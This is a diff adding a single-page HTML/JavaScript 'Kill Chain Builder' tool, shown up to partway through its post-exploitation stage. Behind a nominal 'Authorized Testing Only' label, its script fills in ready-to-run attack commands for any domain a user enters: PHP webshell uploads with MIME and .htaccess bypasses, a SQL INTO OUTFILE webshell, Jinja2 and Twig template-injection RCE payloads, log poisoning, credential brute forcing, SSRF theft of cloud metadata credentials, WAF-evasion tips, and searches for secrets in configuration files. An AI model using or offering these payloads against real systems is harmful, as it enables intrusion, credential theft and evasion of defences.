@@ -1,0 +1,931 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Kill Chain Builder</title>
+<link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=DM+Mono:wght@300;400;500&family=Barlow+Condensed:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg:       #04060a;
+  --s1:       #070b10;
+  --s2:       #0a1018;
+  --s3:       #0e1620;
+  --border:   #132030;
+  --border2:  #1a2d40;
+  --red:      #ff2244;
+  --orange:   #ff6600;
+  --yellow:   #ffcc00;
+  --green:    #00ff88;
+  --cyan:     #00ccff;
+  --purple:   #cc44ff;
+  --text:     #c8dcea;
+  --muted:    #2a4560;
+  --muted2:   #406080;
+  --font:     'DM Mono', monospace;
+  --display:  'Syncopate', sans-serif;
+  --ui:       'Barlow Condensed', sans-serif;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--font);
+  min-height: 100vh;
+  overflow-x: hidden;
+}
+
+/* ── BG EFFECT ── */
+body::before {
+  content:'';
+  position:fixed;inset:0;
+  background:
+    radial-gradient(ellipse 80% 60% at 20% 0%, rgba(255,34,68,0.05) 0%, transparent 60%),
+    radial-gradient(ellipse 60% 50% at 80% 100%, rgba(0,204,255,0.04) 0%, transparent 60%),
+    repeating-linear-gradient(0deg,transparent,transparent 60px,rgba(19,32,48,0.3) 60px,rgba(19,32,48,0.3) 61px),
+    repeating-linear-gradient(90deg,transparent,transparent 60px,rgba(19,32,48,0.3) 60px,rgba(19,32,48,0.3) 61px);
+  pointer-events:none;z-index:0;
+}
+
+/* ── HEADER ── */
+header {
+  position:relative;z-index:10;
+  display:flex;align-items:center;justify-content:space-between;
+  padding:1.2rem 2rem;
+  border-bottom:1px solid var(--border2);
+  background:rgba(7,11,16,0.95);
+  backdrop-filter:blur(10px);
+  flex-wrap:wrap;gap:0.8rem;
+}
+header::after {
+  content:'';position:absolute;bottom:0;left:0;right:0;height:1px;
+  background:linear-gradient(90deg,transparent 0%,var(--red) 30%,var(--orange) 50%,var(--red) 70%,transparent 100%);
+  opacity:0.6;
+}
+.logo {
+  font-family:var(--display);
+  font-size:clamp(1rem,2.5vw,1.3rem);
+  font-weight:700;
+  letter-spacing:0.1em;
+  color:#fff;
+  text-shadow:0 0 30px rgba(255,34,68,0.5);
+}
+.logo span{color:var(--red);}
+.logo em{color:var(--orange);font-style:normal;}
+.header-right{display:flex;align-items:center;gap:1rem;flex-wrap:wrap;}
+.warning-badge{
+  font-family:var(--font);font-size:0.58rem;
+  letter-spacing:0.12em;
+  padding:0.3rem 0.7rem;
+  border:1px solid rgba(255,204,0,0.3);
+  background:rgba(255,204,0,0.05);
+  color:var(--yellow);
+  border-radius:2px;
+  text-transform:uppercase;
+}
+
+/* ── MAIN LAYOUT ── */
+.app{
+  position:relative;z-index:1;
+  max-width:1100px;margin:0 auto;
+  padding:2rem 1.5rem 4rem;
+}
+
+/* ── INPUT PANEL ── */
+.input-panel{
+  background:var(--s1);
+  border:1px solid var(--border2);
+  border-radius:6px;
+  overflow:hidden;
+  margin-bottom:2rem;
+}
+.ip-header{
+  display:flex;align-items:center;gap:0.8rem;
+  padding:0.9rem 1.4rem;
+  border-bottom:1px solid var(--border);
+  background:var(--s2);
+}
+.ip-header-title{
+  font-family:var(--display);font-size:0.65rem;
+  letter-spacing:0.2em;color:var(--red);
+  text-transform:uppercase;
+}
+.ip-header-sub{font-size:0.62rem;color:var(--muted2);margin-left:auto;}
+
+.ip-grid{
+  display:grid;
+  grid-template-columns:1fr 1fr 1fr;
+  gap:1px;background:var(--border);
+}
+@media(max-width:700px){.ip-grid{grid-template-columns:1fr;}}
+
+.ip-field{
+  background:var(--s1);
+  padding:1.2rem 1.4rem;
+}
+.ip-label{
+  font-size:0.58rem;font-family:var(--font);
+  letter-spacing:0.18em;color:var(--muted2);
+  text-transform:uppercase;margin-bottom:0.6rem;
+  display:flex;align-items:center;gap:0.4rem;
+}
+.ip-label-dot{width:5px;height:5px;border-radius:50%;background:var(--red);}
+
+.ip-input,.ip-select,.ip-textarea{
+  width:100%;
+  background:var(--s2);
+  border:1px solid var(--border2);
+  border-radius:3px;
+  color:var(--text);
+  font-family:var(--font);
+  font-size:0.78rem;
+  padding:0.6rem 0.8rem;
+  outline:none;
+  transition:border-color 0.2s,box-shadow 0.2s;
+}
+.ip-input:focus,.ip-select:focus,.ip-textarea:focus{
+  border-color:var(--red);
+  box-shadow:0 0 0 1px rgba(255,34,68,0.15),inset 0 0 12px rgba(255,34,68,0.04);
+}
+.ip-input::placeholder,.ip-textarea::placeholder{color:var(--muted);}
+.ip-select option{background:#0a1018;}
+.ip-textarea{resize:vertical;height:80px;line-height:1.6;}
+
+.ip-checks{display:flex;flex-wrap:wrap;gap:0.5rem;margin-top:0.4rem;}
+.ip-check{
+  display:flex;align-items:center;gap:0.35rem;
+  font-size:0.68rem;color:var(--muted2);cursor:pointer;
+  padding:0.25rem 0.6rem;
+  border:1px solid var(--border);
+  border-radius:2px;background:var(--s2);
+  transition:all 0.15s;user-select:none;
+}
+.ip-check input{display:none;}
+.ip-check.checked{border-color:var(--red);color:var(--red);background:rgba(255,34,68,0.06);}
+
+.ip-footer{
+  padding:1rem 1.4rem;
+  display:flex;align-items:center;justify-content:space-between;
+  border-top:1px solid var(--border);
+  gap:1rem;flex-wrap:wrap;
+}
+.ip-footer-hint{font-size:0.62rem;color:var(--muted2);line-height:1.6;max-width:400px;}
+
+.btn-build{
+  font-family:var(--ui);font-weight:900;
+  font-size:0.9rem;letter-spacing:0.15em;
+  text-transform:uppercase;
+  padding:0.7rem 2.2rem;
+  background:linear-gradient(135deg,var(--red) 0%,var(--orange) 100%);
+  border:none;border-radius:3px;
+  color:#000;cursor:pointer;
+  box-shadow:0 0 24px rgba(255,34,68,0.35);
+  transition:all 0.2s;
+  white-space:nowrap;
+}
+.btn-build:hover{box-shadow:0 0 40px rgba(255,34,68,0.6);transform:translateY(-1px);}
+.btn-build:disabled{opacity:0.5;cursor:not-allowed;transform:none;}
+
+.btn-demo{
+  font-family:var(--ui);font-weight:600;
+  font-size:0.82rem;letter-spacing:0.1em;
+  text-transform:uppercase;
+  padding:0.7rem 1.4rem;
+  background:transparent;
+  border:1px solid rgba(0,204,255,0.3);
+  border-radius:3px;color:var(--cyan);
+  cursor:pointer;transition:all 0.2s;
+}
+.btn-demo:hover{background:rgba(0,204,255,0.08);border-color:var(--cyan);}
+
+/* ── LOADING ── */
+.loading{
+  display:none;
+  flex-direction:column;align-items:center;
+  padding:3rem;gap:1.2rem;
+}
+.loading-bar{
+  width:300px;height:2px;
+  background:var(--border2);
+  border-radius:1px;overflow:hidden;
+  position:relative;
+}
+.loading-bar::after{
+  content:'';
+  position:absolute;left:-40%;width:40%;height:100%;
+  background:linear-gradient(90deg,transparent,var(--red),var(--orange),transparent);
+  animation:scan 1.2s ease-in-out infinite;
+}
+@keyframes scan{to{left:140%;}}
+.loading-text{
+  font-size:0.7rem;font-family:var(--font);
+  color:var(--muted2);letter-spacing:0.1em;
+  animation:fade 0.8s ease-in-out infinite alternate;
+}
+@keyframes fade{to{opacity:0.3;}}
+
+/* ── RESULT ── */
+#result{display:none;}
+
+/* ── CHAIN HEADER ── */
+.chain-header{
+  display:flex;align-items:flex-end;justify-content:space-between;
+  margin-bottom:2rem;padding-bottom:1rem;
+  border-bottom:1px solid var(--border2);
+  flex-wrap:wrap;gap:1rem;
+}
+.chain-title-wrap{}
+.chain-eyebrow{
+  font-size:0.6rem;font-family:var(--font);
+  letter-spacing:0.2em;color:var(--red);
+  text-transform:uppercase;margin-bottom:0.4rem;
+}
+.chain-title{
+  font-family:var(--display);
+  font-size:clamp(1.2rem,3vw,1.8rem);
+  font-weight:700;letter-spacing:0.05em;
+  color:#fff;line-height:1.1;
+}
+.chain-title span{color:var(--red);}
+.chain-meta{
+  display:flex;gap:1rem;flex-wrap:wrap;margin-top:0.6rem;
+}
+.chain-meta-item{
+  font-size:0.65rem;font-family:var(--font);
+  color:var(--muted2);display:flex;align-items:center;gap:0.35rem;
+}
+.chain-meta-item strong{color:var(--text);}
+.chain-risk{
+  font-family:var(--ui);font-weight:900;
+  font-size:1.4rem;letter-spacing:0.05em;
+  padding:0.5rem 1.4rem;
+  border-radius:3px;
+  border:2px solid;
+  text-transform:uppercase;
+}
+
+/* ── TIMELINE ── */
+.timeline{position:relative;}
+.timeline::before{
+  content:'';
+  position:absolute;left:22px;top:0;bottom:0;width:2px;
+  background:linear-gradient(to bottom,var(--red),var(--orange),var(--yellow),var(--green),var(--cyan),var(--purple));
+  opacity:0.4;
+}
+
+.stage{
+  display:flex;gap:1.5rem;
+  margin-bottom:1.5rem;
+  position:relative;
+  opacity:0;transform:translateX(-20px);
+  transition:opacity 0.4s ease,transform 0.4s ease;
+}
+.stage.visible{opacity:1;transform:translateX(0);}
+
+.stage-node{
+  flex-shrink:0;
+  width:46px;height:46px;
+  border-radius:50%;
+  display:flex;align-items:center;justify-content:center;
+  font-family:var(--display);font-size:0.7rem;font-weight:700;
+  border:2px solid;
+  position:relative;z-index:1;
+  background:var(--bg);
+}
+
+.stage-body{
+  flex:1;
+  background:var(--s1);
+  border:1px solid var(--border2);
+  border-radius:5px;
+  overflow:hidden;
+  transition:border-color 0.2s,box-shadow 0.2s;
+}
+.stage-body:hover{border-color:var(--border2);box-shadow:0 4px 24px rgba(0,0,0,0.4);}
+
+.stage-head{
+  display:flex;align-items:center;gap:0.8rem;
+  padding:0.9rem 1.2rem;
+  border-bottom:1px solid var(--border);
+  cursor:pointer;
+  background:var(--s2);
+  user-select:none;
+}
+.stage-num{
+  font-family:var(--font);font-size:0.58rem;
+  letter-spacing:0.1em;color:var(--muted2);
+  flex-shrink:0;
+}
+.stage-name{
+  font-family:var(--ui);font-weight:700;
+  font-size:1rem;letter-spacing:0.1em;
+  text-transform:uppercase;flex:1;
+}
+.stage-badge{
+  font-size:0.58rem;font-family:var(--font);
+  padding:2px 7px;border-radius:2px;
+  letter-spacing:0.08em;flex-shrink:0;
+}
+.stage-toggle{
+  font-size:0.7rem;color:var(--muted2);
+  transition:transform 0.25s;flex-shrink:0;
+}
+.stage-toggle.open{transform:rotate(180deg);}
+
+.stage-content{
+  max-height:0;overflow:hidden;
+  transition:max-height 0.35s ease;
+}
+.stage-content.open{max-height:1000px;}
+
+.stage-inner{padding:1.2rem;}
+
+.stage-desc{
+  font-size:0.78rem;color:var(--muted2);
+  line-height:1.7;margin-bottom:1rem;
+  border-left:2px solid var(--border2);
+  padding-left:0.8rem;
+}
+
+.section-label{
+  font-size:0.56rem;font-family:var(--font);
+  letter-spacing:0.18em;color:var(--muted);
+  text-transform:uppercase;margin-bottom:0.5rem;
+  display:flex;align-items:center;gap:0.5rem;
+}
+.section-label::after{content:'';flex:1;height:1px;background:var(--border);}
+
+/* code blocks */
+.code-block{
+  background:#030508;
+  border:1px solid var(--border);
+  border-radius:4px;
+  padding:0.9rem 1rem;
+  margin-bottom:0.8rem;
+  position:relative;
+  overflow-x:auto;
+}
+.code-block pre{
+  font-family:var(--font);font-size:0.72rem;
+  color:#7ec8e3;line-height:1.8;white-space:pre;
+}
+.code-comment{color:#2a4a6a;}
+.code-cmd{color:#00ff88;}
+.code-flag{color:#ffcc00;}
+.code-path{color:#cc88ff;}
+.code-string{color:#ff8844;}
+
+.copy-btn{
+  position:absolute;top:0.5rem;right:0.5rem;
+  background:var(--s3);border:1px solid var(--border2);
+  color:var(--muted2);font-family:var(--font);
+  font-size:0.6rem;padding:0.2rem 0.5rem;
+  border-radius:2px;cursor:pointer;
+  transition:all 0.15s;letter-spacing:0.05em;
+}
+.copy-btn:hover{border-color:var(--red);color:var(--red);}
+.copy-btn.ok{background:rgba(0,255,136,0.1);border-color:var(--green);color:var(--green);}
+
+/* tags */
+.tags{display:flex;flex-wrap:wrap;gap:0.35rem;margin-bottom:0.8rem;}
+.tag{
+  font-size:0.62rem;font-family:var(--font);
+  padding:3px 8px;border-radius:2px;
+  border:1px solid;
+}
+
+/* objectives */
+.objectives{
+  display:grid;grid-template-columns:1fr 1fr;
+  gap:0.4rem;margin-bottom:0.8rem;
+}
+@media(max-width:500px){.objectives{grid-template-columns:1fr;}}
+.obj{
+  font-size:0.68rem;color:var(--text);
+  padding:0.4rem 0.6rem;
+  background:var(--s3);
+  border:1px solid var(--border);
+  border-radius:3px;
+  display:flex;align-items:center;gap:0.4rem;
+}
+.obj::before{content:'▸';color:var(--orange);flex-shrink:0;}
+
+/* ── SUMMARY BAR ── */
+.summary-bar{
+  display:flex;gap:1px;
+  margin-bottom:2rem;
+  border-radius:4px;overflow:hidden;
+  height:6px;
+  background:var(--border);
+}
+.sb-seg{height:100%;transition:flex 0.6s ease;}
+
+/* ── EXPORT ── */
+.export-row{
+  display:flex;gap:0.8rem;margin-top:2rem;flex-wrap:wrap;
+}
+.btn-export{
+  font-family:var(--ui);font-weight:700;
+  font-size:0.78rem;letter-spacing:0.1em;text-transform:uppercase;
+  padding:0.6rem 1.4rem;border-radius:3px;cursor:pointer;
+  transition:all 0.2s;
+}
+.btn-export-primary{
+  background:var(--s2);border:1px solid var(--border2);color:var(--text);
+}
+.btn-export-primary:hover{border-color:var(--cyan);color:var(--cyan);}
+
+/* ── SCROLLBAR ── */
+::-webkit-scrollbar{width:4px;height:4px;}
+::-webkit-scrollbar-track{background:transparent;}
+::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px;}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">KILL<span>CHAIN</span>.<em>BUILD</em></div>
+  <div class="header-right">
+    <div class="warning-badge">⚠ Authorized Testing Only</div>
+  </div>
+</header>
+
+<div class="app">
+
+  <!-- INPUT PANEL -->
+  <div class="input-panel" id="input-panel">
+    <div class="ip-header">
+      <div class="ip-label-dot"></div>
+      <div class="ip-header-title">Target Intelligence</div>
+      <div class="ip-header-sub">Fill in what you know — the more detail, the more precise the chain</div>
+    </div>
+
+    <div class="ip-grid">
+      <div class="ip-field">
+        <div class="ip-label"><div class="ip-label-dot"></div>Target Domain / App</div>
+        <input class="ip-input" id="f-domain" placeholder="e.g. app.example.com" type="text">
+      </div>
+      <div class="ip-field">
+        <div class="ip-label"><div class="ip-label-dot" style="background:var(--orange)"></div>Tech Stack</div>
+        <input class="ip-input" id="f-stack" placeholder="e.g. PHP, Laravel, MySQL, nginx" type="text">
+      </div>
+      <div class="ip-field">
+        <div class="ip-label"><div class="ip-label-dot" style="background:var(--cyan)"></div>Attack Type</div>
+        <select class="ip-select" id="f-type">
+          <option value="web">Web Application</option>
+          <option value="api">REST API</option>
+          <option value="cms">CMS (WordPress/Drupal)</option>
+          <option value="network">Network / Infrastructure</option>
+          <option value="mobile">Mobile App Backend</option>
+          <option value="cloud">Cloud / AWS / Azure</option>
+        </select>
+      </div>
+      <div class="ip-field">
+        <div class="ip-label"><div class="ip-label-dot" style="background:var(--yellow)"></div>Initial Finding</div>
+        <select class="ip-select" id="f-finding">
+          <option value="fileupload">File Upload Endpoint</option>
+          <option value="sqli">SQL Injection</option>
+          <option value="ssti">SSTI Vulnerability</option>
+          <option value="ssrf">SSRF</option>
+          <option value="xss">XSS (Stored/Reflected)</option>
+          <option value="idor">IDOR / Broken Access</option>
+          <option value="rce">Direct RCE</option>
+          <option value="lfi">LFI / Path Traversal</option>
+          <option value="auth">Auth Bypass / Weak Creds</option>
+          <option value="xxe">XXE Injection</option>
+        </select>
+      </div>
+      <div class="ip-field">
+        <div class="ip-label"><div class="ip-label-dot" style="background:var(--purple)"></div>Auth Level</div>
+        <select class="ip-select" id="f-auth">
+          <option value="none">Unauthenticated</option>
+          <option value="user">Authenticated (Low Priv)</option>
+          <option value="admin">Authenticated (Admin)</option>
+        </select>
+      </div>
+      <div class="ip-field">
+        <div class="ip-label"><div class="ip-label-dot" style="background:var(--green)"></div>Objective</div>
+        <select class="ip-select" id="f-objective">
+          <option value="rce">Remote Code Execution</option>
+          <option value="data">Data Exfiltration</option>
+          <option value="privesc">Privilege Escalation</option>
+          <option value="persistence">Persistence / Backdoor</option>
+          <option value="dos">Denial of Service</option>
+        </select>
+      </div>
+    </div>
+
+    <div class="ip-field" style="border-top:1px solid var(--border);">
+      <div class="ip-label"><div class="ip-label-dot" style="background:var(--muted2)"></div>Additional Notes (optional)</div>
+      <textarea class="ip-textarea" id="f-notes" placeholder="WAF detected, rate limiting in place, known CVEs, specific versions, etc."></textarea>
+    </div>
+
+    <div class="ip-footer">
+      <div class="ip-footer-hint">This tool generates educational attack chains for authorized penetration testing. Never use against systems you don't own.</div>
+      <div style="display:flex;gap:0.8rem;flex-wrap:wrap;">
+        <button class="btn-demo" onclick="loadDemo()">⚗ Load Demo</button>
+        <button class="btn-build" id="build-btn" onclick="buildChain()">⚡ Build Kill Chain</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- LOADING -->
+  <div class="loading" id="loading">
+    <div style="font-family:var(--display);font-size:0.8rem;letter-spacing:0.2em;color:var(--red);">BUILDING KILL CHAIN</div>
+    <div class="loading-bar"></div>
+    <div class="loading-text" id="loading-text">Analyzing target profile...</div>
+  </div>
+
+  <!-- RESULT -->
+  <div id="result">
+    <div class="chain-header">
+      <div class="chain-title-wrap">
+        <div class="chain-eyebrow">Generated Kill Chain</div>
+        <div class="chain-title" id="chain-title">Target: <span id="ct-domain">—</span></div>
+        <div class="chain-meta">
+          <div class="chain-meta-item">Stack: <strong id="cm-stack">—</strong></div>
+          <div class="chain-meta-item">Entry: <strong id="cm-finding">—</strong></div>
+          <div class="chain-meta-item">Stages: <strong id="cm-stages">7</strong></div>
+        </div>
+      </div>
+      <div class="chain-risk" id="chain-risk">HIGH</div>
+    </div>
+
+    <!-- Progress bar -->
+    <div class="summary-bar" id="summary-bar"></div>
+
+    <!-- Timeline -->
+    <div class="timeline" id="timeline"></div>
+
+    <div class="export-row">
+      <button class="btn-export btn-export-primary" onclick="copyReport()">📋 Copy Full Report</button>
+      <button class="btn-export btn-export-primary" onclick="resetBuilder()">↺ New Chain</button>
+    </div>
+  </div>
+
+</div>
+
+<script>
+// ── STAGE COLORS ──────────────────────────────────────────────────────────────
+const STAGE_COLORS = [
+  '#ff2244','#ff6600','#ff9900','#ffcc00','#aadd00','#00ff88','#00ccff'
+];
+
+// ── KILL CHAIN DATABASE ───────────────────────────────────────────────────────
+function generateChain(domain, stack, type, finding, auth, objective, notes) {
+  const isphp = /php|laravel|symfony|wordpress|drupal|wp/i.test(stack);
+  const ispython = /python|django|flask|fastapi/i.test(stack);
+  const isnode = /node|express|next|nuxt/i.test(stack);
+  const isjava = /java|spring|tomcat|struts/i.test(stack);
+  const islinux = !/windows|iis|asp/i.test(stack);
+  const haswaf = /waf|cloudflare|akamai|modsec/i.test(notes);
+  const hasmysql = /mysql|mariadb/i.test(stack);
+  const haspgsql = /postgres|pg/i.test(stack);
+  const hasmongo = /mongo/i.test(stack);
+  const iscloud = type === 'cloud' || /aws|azure|gcp|s3|lambda/i.test(stack);
+  const iscms = type === 'cms' || /wordpress|wp|drupal|joomla/i.test(stack);
+
+  // Stage builder helpers
+  const mkStage = (num, phase, name, color, badge, desc, objectives, tools, commands, notes_) => ({
+    num, phase, name, color, badge, desc, objectives, tools, commands, notes: notes_
+  });
+
+  const stages = [];
+
+  // ── STAGE 1: RECONNAISSANCE ──────────────────────────────────────────────
+  const reconCmds = [];
+  if(domain&&domain!=='example.com'){
+    reconCmds.push(`# Passive recon — enumerate subdomains\nsubfinder -d ${domain} -silent | tee subdomains.txt\namass enum -passive -d ${domain} | tee -a subdomains.txt`);
+    reconCmds.push(`# DNS enumeration\ndnsx -l subdomains.txt -a -cname -resp | tee dns-results.txt\n\n# Check for live hosts\nhttpx -l subdomains.txt -status-code -title -tech-detect | tee live-hosts.txt`);
+    if(iscms){
+      reconCmds.push(`# CMS fingerprint + version\nwpscan --url https://${domain} --enumerate u,p,t --api-token YOUR_TOKEN\n\n# Check xmlrpc\ncurl -s https://${domain}/xmlrpc.php | head -5`);
+    }
+    reconCmds.push(`# Tech stack fingerprint\nwhatweb -a 3 https://${domain}\nnmap -sV -sC -p 80,443,8080,8443 ${domain}`);
+  } else {
+    reconCmds.push(`# Passive recon\nsubfinder -d TARGET_DOMAIN -silent | tee subdomains.txt\namass enum -passive -d TARGET_DOMAIN`);
+    reconCmds.push(`# Active fingerprinting\nnmap -sV -sC -p- TARGET_IP\nwhatweb -a 3 https://TARGET_DOMAIN`);
+  }
+  stages.push(mkStage(1,'RECONNAISSANCE','Recon & Footprinting',STAGE_COLORS[0],'PASSIVE',
+    `Map the full attack surface of ${domain||'the target'} before touching any endpoints. Goal is maximum information with minimum noise.`,
+    ['Enumerate subdomains & live hosts','Fingerprint tech stack and versions','Identify exposed admin panels & login pages','Find historical URLs via Wayback Machine','Harvest emails & employee names'],
+    ['Subfinder','Amass','dnsx','httpx','WhatWeb','Waybackurls','theHarvester'],
+    reconCmds,
+    haswaf?'WAF detected — use passive techniques only initially. Consider slow-rate scanning.':null
+  ));
+
+  // ── STAGE 2: SCANNING ────────────────────────────────────────────────────
+  const scanCmds = [];
+  if(finding==='sqli'){
+    scanCmds.push(`# Find injection points\ngau ${domain||'TARGET'} | gf sqli | tee sqli-params.txt\n\n# Automated scan\nsqlmap -m sqli-params.txt --batch --level=3 --risk=2`);
+    scanCmds.push(`# Manual test — error-based\ncurl -s "https://${domain||'TARGET'}/page?id=1'"  | grep -i "error\\|sql\\|mysql"`);
+  } else if(finding==='xss'){
+    scanCmds.push(`# Reflected XSS discovery\ngau ${domain||'TARGET'} | gf xss | tee xss-params.txt\ndalfox file xss-params.txt --skip-bav`);
+    scanCmds.push(`# Stored XSS — check input fields\n# Probe: <img src=x onerror=alert(1)>\n# Probe: "><script>alert(document.domain)</script>`);
+  } else if(finding==='fileupload'){
+    scanCmds.push(`# Find upload endpoints\ngau ${domain||'TARGET'} | grep -iE "upload|file|attach|import"\nffuf -w /usr/share/wordlists/common.txt -u https://${domain||'TARGET'}/FUZZ -mc 200,301,302`);
+    scanCmds.push(`# Test allowed extensions\ncurl -X POST https://${domain||'TARGET'}/upload -F "file=@test.php" -v\ncurl -X POST https://${domain||'TARGET'}/upload -F "file=@test.php.jpg" -v`);
+  } else if(finding==='ssti'){
+    scanCmds.push(`# Detect template engine\n# Probe: {{7*7}} → 49 (Jinja2/Twig)\n# Probe: \${7*7} → 49 (Velocity)\n# Probe: <%= 7*7 %> → 49 (EJS)\n\ncurl -s "https://${domain||'TARGET'}/search?q={{7*7}}" | grep "49"`);
+    scanCmds.push(`# Fingerprint engine version\n# Jinja2:\ncurl -s "https://${domain||'TARGET'}/?x={{config.items()}}" | head -20\n\n# Twig:\ncurl -s "https://${domain||'TARGET'}/?x={{_self.env.getExtension('Twig')}}"`)
+  } else {
+    scanCmds.push(`# Directory & endpoint discovery\nffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \\\n  -u https://${domain||'TARGET'}/FUZZ -mc 200,301,302,403 -t 50`);
+    scanCmds.push(`# Parameter fuzzing\narjun -u https://${domain||'TARGET'}/api/endpoint --stable\n\n# JS secrets\ngau ${domain||'TARGET'} | grep "\\.js$" | httpx -mc 200 | \\\n  xargs -I{} curl -s {} | grep -oE "(api_key|secret|token|password)\\s*=\\s*[\"'][^\"']+"`);
+  }
+  stages.push(mkStage(2,'SCANNING','Vulnerability Discovery',STAGE_COLORS[1],'ACTIVE',
+    `Active scanning phase targeting the identified ${finding.toUpperCase()} vector. Map all parameters, endpoints, and entry points before exploitation.`,
+    ['Identify all injection points','Map API endpoints & parameters','Check for WAF/IDS signatures','Confirm vulnerability class','Note rate limiting & security controls'],
+    ['ffuf','arjun','nuclei','dalfox','sqlmap','gau','gf'],
+    scanCmds,
+    haswaf?'Reduce thread count. Use random delays: --delay 2 --timeout 10. Consider IP rotation via proxychains.':null
+  ));
+
+  // ── STAGE 3: INITIAL ACCESS ──────────────────────────────────────────────
+  const accessCmds = [];
+  if(finding==='fileupload'){
+    if(isphp){
+      accessCmds.push(`# PHP webshell — bypass MIME check\n# Create: shell.php.jpg with content:\n<?php system($_GET['cmd']); ?>\n\n# Upload via curl\ncurl -X POST https://${domain||'TARGET'}/upload \\\n  -F "file=@shell.php.jpg;type=image/jpeg" \\\n  -H "Cookie: session=YOUR_SESSION"`);
+      accessCmds.push(`# .htaccess bypass (Apache)\n# Upload .htaccess:\nAddType application/x-httpd-php .jpg\n\n# Then upload shell.jpg with PHP content`);
+      accessCmds.push(`# Verify execution\ncurl "https://${domain||'TARGET'}/uploads/shell.php.jpg?cmd=id"`);
+    } else {
+      accessCmds.push(`# Upload polyglot file\n# Combine valid image header + payload\nprintf '\\xff\\xd8\\xff\\xe0' > shell.jpg\necho '<?php system($_GET["cmd"]); ?>' >> shell.jpg\n\ncurl -X POST https://${domain||'TARGET'}/upload -F "file=@shell.jpg"`);
+    }
+  } else if(finding==='sqli'){
+    accessCmds.push(`# Confirm injectable parameter\nsqlmap -u "https://${domain||'TARGET'}/page?id=1" \\\n  --dbs --batch --random-agent\n\n# Extract tables\nsqlmap -u "https://${domain||'TARGET'}/page?id=1" \\\n  -D app_db --tables --batch`);
+    if(hasmysql){
+      accessCmds.push(`# Write webshell via INTO OUTFILE (MySQL)\nsqlmap -u "https://${domain||'TARGET'}/page?id=1" \\\n  --os-shell --batch\n\n# Manual:\n' UNION SELECT "" INTO OUTFILE '/var/www/html/shell.php' -- -`);
+    }
+  } else if(finding==='ssti'){
+    if(ispython){
+      accessCmds.push(`# Jinja2 — Remote Code Execution\n# Payload:\n{{"".__class__.__mro__[1].__subclasses__()[40]('/bin/bash -c "id"',shell=True,stdout=-1).communicate()[0]}}\n\n# URL encoded:\ncurl -s "https://${domain||'TARGET'}/?q=%7B%7B%22%22.__class__.__mro__%5B1%5D.__subclasses__%28%29%5B40%5D%28%27id%27%2Cshell%3DTrue%2Cstdout%3D-1%29.communicate%28%29%5B0%5D%7D%7D"`);
+    } else if(isphp){
+      accessCmds.push(`# Twig — Code Execution\n# Payload:\n{{_self.env.registerUndefinedFilterCallback("exec")}}\n{{_self.env.getFilter("id")}}\n\n# Alternative:\n{{['id']|filter('system')}}`);
+    }
+  } else if(finding==='lfi'){
+    accessCmds.push(`# Basic LFI\ncurl "https://${domain||'TARGET'}/page?file=../../../../etc/passwd"\n\n# Null byte bypass\ncurl "https://${domain||'TARGET'}/page?file=../../../../etc/passwd%00"\n\n# PHP filter wrapper\ncurl "https://${domain||'TARGET'}/?file=php://filter/convert.base64-encode/resource=index.php"`);
+    accessCmds.push(`# LFI → RCE via log poisoning\n# 1. Inject PHP in User-Agent:\ncurl -H "User-Agent: <?php system('id'); ?>" https://${domain||'TARGET'}/\n\n# 2. Include Apache log:\ncurl "https://${domain||'TARGET'}/?file=../../../../var/log/apache2/access.log"`);
+  } else if(finding==='auth'){
+    accessCmds.push(`# Default credentials\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \\\n  -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \\\n  https-post-form "/login:user=^USER^&pass=^PASS^:Invalid"\n\n# JWT none algorithm attack\n# Decode header → change alg to "none" → remove signature`);
+  } else if(finding==='ssrf'){
+    accessCmds.push(`# SSRF — internal service probe\ncurl "https://${domain||'TARGET'}/fetch?url=http://169.254.169.254/latest/meta-data/"\ncurl "https://${domain||'TARGET'}/fetch?url=http://localhost:8080/admin"\n\n# Cloud metadata (AWS)\ncurl "https://${domain||'TARGET'}/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"`);
+  } else {
+    accessCmds.push(`# Generic initial access\nnuclei -u https://${domain||'TARGET'} -t cves/ -severity critical,high\n\n# Check for known CVEs based on stack version\nsearchsploit ${stack||'target framework'}`);
+  }
+  stages.push(mkStage(3,'INITIAL ACCESS','Exploitation',STAGE_COLORS[2],'CRITICAL',
+    `Execute the primary exploit to gain initial foothold. Targeting the ${finding.toUpperCase()} vulnerability identified in stage 2.`,
+    ['Execute primary payload','Bypass security filters (WAF/input validation)','Confirm code execution or access','Establish initial shell or data access','Avoid triggering alerts'],
+    ['Burp Suite','sqlmap','curl','python3','netcat','msfconsole'],
+    accessCmds,
+    haswaf?'Encode payloads. Try chunked encoding, case manipulation, and comment injection to bypass WAF signatures.':null
+  ));
+
+  // ── STAGE 4: POST-EXPLOITATION ───────────────────────────────────────────
+  const postCmds = [];
+  if(islinux){
+    postCmds.push(`# System enumeration\nid && whoami && uname -a\ncat /etc/os-release\ncat /etc/passwd | grep -v nologin\nps aux | grep -v "\\["\nnetstat -tulpn 2>/dev/null || ss -tulpn`);
+    postCmds.push(`# Find sensitive files\nfind / -name "*.env" -o -name "config.php" -o -name "wp-config.php" \\\n  -o -name "settings.py" -o -name "database.yml" 2>/dev/null\n\n# Check environment variables\nenv | grep -iE "pass|key|token|secret|db|api"`);
+    postCmds.push(`# Check sudo permissions\nsudo -l\n\n# SUID binaries\nfind / -perm -4000 -type f 2>/dev/null\n\n# Writable directories\nfind / -writable -type d 2>/dev/null | grep -v proc`);
+  } else {
+    postCmds.push(`# Windows enumeration\nwhoami /all\nipconfig /all\nsysteminfo\nnet user\nnet localgroup administrators`);
+  }
+  stages.push(mkStage(4,'POST-EXPLOITATION','Enumeration & Pillaging',STAGE_COLORS[3],'HIGH',
+    `With initial access established, enumerate the target system thoroughly. Extract credentials, map the network, and identify privilege escalation paths.`,
+    ['Identify current user and permissions','Find credentials in config files','Map internal network topology','Check for database access','Identify priv-esc vectors'],
